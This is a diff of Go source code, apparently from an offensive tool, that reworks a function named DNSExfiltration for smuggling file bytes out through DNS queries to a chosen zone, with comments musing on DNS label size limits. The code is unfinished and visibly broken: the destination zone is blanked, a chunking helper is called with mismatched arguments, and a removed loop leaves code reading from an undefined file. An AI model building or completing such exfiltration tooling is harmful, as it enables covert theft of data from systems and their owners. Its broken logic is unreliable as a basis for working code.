@@ -25,7 +25,6 @@ func DataChunk(DataIn []byte, chunksize uint32) []byte { //, derp error) {
 	return DataOutBuffer
 	//maybe return chunk_num int as well
 }
-
 // makes chunky data for packet stuffing
 // UNKnown Chunk size, based on number of chunks needed
 func DataChunkerUnkChunk(DataIn []byte, NumChunk uint32) []byte { //, derp error) {
@@ -41,7 +40,9 @@ func DataChunkerUnkChunk(DataIn []byte, NumChunk uint32) []byte { //, derp error
 }
 
 // Exports a sequence of bytes via DNS packets
-func DNSExfiltration(ByteArrayInput []byte, DestZone string) (herp, derp error) {
+// max message size should be below 63 but 5 ... I guess?
+// 63 is total available per packet I think
+func DNSExfiltration(ByteArrayInput []byte, DestZone string, MaxMsgSize uint16) (herp, derp error) {
 	var debug bool = true
 	//the local file to exfiltrate.
 	//var file []byte = ByteArrayInput
@@ -50,12 +51,17 @@ func DNSExfiltration(ByteArrayInput []byte, DestZone string) (herp, derp error) 
 	// the dns zone to send the queries to.
 	DestZone = ""
 
-	DataChunker()
+	// 90 bytes wide, thats the number given by the original source...
+	// Which doesnt make sense? the final structure to fit this into only
+	// allows :
+	// Length: Each label can theoretically be from 0 to 63 characters in 
+	//	 length. In practice, a length of 1 to about 20 characters is most
+	//	 common, with a special exception for the label assigned to the 
+	//	 root of the tree (see below).
+	DataChunker(ByteArrayInput, MaxMsgSize)
 	// Numbers for the file chunks
 	chunk := 0
-
-	for {
-		dataBytes = dataBytes[:cap(dataBytes)]
+	dataBytes = dataBytes[:cap(dataBytes)]
 		bytesRead, err := f.Read(dataBytes)
 
 		dataBytes = dataBytes[:bytesRead]
